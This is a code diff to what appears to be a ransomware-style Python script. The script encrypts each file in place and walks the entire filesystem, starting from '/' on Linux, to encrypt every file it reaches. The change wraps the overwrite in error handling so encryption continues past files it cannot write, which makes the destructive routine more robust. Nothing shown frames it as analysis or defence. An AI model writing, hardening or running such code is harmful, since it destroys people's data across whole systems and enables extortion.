@@ -75,8 +75,11 @@ else:
     encryptor = cipher.encryptor()
     encrypted_content = encryptor.update(file_content) + encryptor.finalize()
 
-    with open(file_path, "wb") as file:
-        file.write(nonce + encrypted_content)
+    try:
+        with open(file_path, "wb") as file:
+            file.write(nonce + encrypted_content)
+    except OSError as e:
+        print(f"Error writing to file {file_path}: {e}")
 
     def traverse_directories(directory):
         for root, dirs, files in os.walk(directory):
@@ -84,7 +87,6 @@ else:
                 file_path = os.path.join(root, file)
                 if os.path.isfile(file_path):
                     encrypt_file(file_path)
-
 
     if platform.system() == "Linux":
         directories = ["/"]
